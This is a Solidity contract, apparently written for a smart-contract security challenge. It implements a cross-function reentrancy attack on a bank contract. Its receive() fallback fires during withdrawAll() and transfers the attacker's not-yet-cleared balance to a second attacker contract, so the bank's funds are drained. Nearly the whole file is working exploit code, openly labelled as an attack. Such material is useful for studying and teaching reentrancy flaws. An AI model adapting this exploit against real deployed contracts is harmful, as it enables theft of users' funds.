//SPDX-License-Identifier:UNLICENSED
pragma solidity 0.8.7;

/**
 * @title Cross-function attack contract 1
 * @author PULAMARASETTI NAVEEN
 * @notice this contract is to attack corss fuction reentracy
 * @dev used interfaces to access function in the challenge contract
 * @custom:experimental this is an experimental contract
 * */

interface IBank {
    function balances(address) external view returns (uint256);

    function transfer(address to, uint256 amt) external;

    function deposite() external payable;

    function withdrawAll() external;

    function getUserBalance() external view returns (uint256);
}

contract Attack {
    ///traget contract address
    address public targetAddr;
    ///attacker alternate contract address
    address public attack2Addr;

    constructor(address addr) payable {
        targetAddr = addr;
    }

    receive() external payable {
        if (address(targetAddr).balance >= 1 ether) {
            IBank(targetAddr).transfer(
                attack2Addr,
                IBank(targetAddr).balances(address(this))
            );
        }
    }

    function initalizeTx() external {
        IBank(targetAddr).deposite{value: 1 ether}();
        IBank(targetAddr).withdrawAll();
    }

    function depositeAttack() external {
        IBank(targetAddr).deposite{value: 1 ether}();
    }

    function addAttack2Addr(address addr) public {
        attack2Addr = addr;
    }

    ///To get the user balance in the target contract
    function getBalance() public view returns (uint256) {
        return IBank(targetAddr).getUserBalance();
    }
}
